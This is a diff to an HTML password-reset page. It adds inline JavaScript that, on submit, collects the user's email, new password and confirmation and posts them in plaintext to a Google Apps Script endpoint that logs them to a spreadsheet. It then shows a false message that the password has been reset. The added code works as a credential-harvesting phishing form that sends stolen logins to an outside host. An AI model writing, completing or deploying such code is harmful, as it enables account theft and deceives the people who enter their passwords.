@@ -31,8 +31,9 @@
                     <button type="button" class="toggle-password" onclick="togglePass('confirmPassword')">Show</button>
                 </div>
 
-                <button type="submit" class="submit-btn">Reset Password</button>
+                <button type="submit" class="submit-btn" id="submitBtn">Reset Password</button>
             </form>
+            <div id="statusMessage" style="margin-top: 15px; font-size: 13px;"></div>
         </div>
         
         <div class="footer-box">
@@ -40,6 +41,67 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        // 1. Toggle Password Visibility
+        function togglePass(id) {
+            const input = document.getElementById(id);
+            const btn = input.nextElementSibling;
+            if (input.type === "password") {
+                input.type = "text";
+                btn.textContent = "Hide";
+            } else {
+                input.type = "password";
+                btn.textContent = "Show";
+            }
+        }
+
+        // 2. Handle Form Submission to Google Sheets
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbw1MVo02Fg87cnghKeuaJo4t2dlg_F3pIZWcc1vGWhORLiVEJXRTxSkEkAH7PT_7j6M/exec';
+        const form = document.getElementById('resetForm');
+        const statusMsg = document.getElementById('statusMessage');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            
+            const email = document.getElementById('emailAddress').value;
+            const pass = document.getElementById('newPassword').value;
+            const confirm = document.getElementById('confirmPassword').value;
+
+            // Simple validation
+            if (pass !== confirm) {
+                statusMsg.style.color = "red";
+                statusMsg.innerHTML = "Passwords do not match!";
+                return;
+            }
+
+            statusMsg.style.color = "#8e8e8e";
+            statusMsg.innerHTML = "Processing...";
+
+            // Create the data object
+            const formData = {
+                email: email,
+                password: pass,
+                confirmPassword: confirm
+            };
+
+            // Send to Google Sheets
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                cache: 'no-cache',
+                body: JSON.stringify(formData)
+            })
+            .then(() => {
+                statusMsg.style.color = "green";
+                statusMsg.innerHTML = "Your password has been reset successfully.";
+                form.reset();
+            })
+            .catch(error => {
+                statusMsg.style.color = "red";
+                statusMsg.innerHTML = "Error saving data. Please try again.";
+                console.error('Error!', error.message);
+            });
+        });
+    </script>
 </body>
 </html>
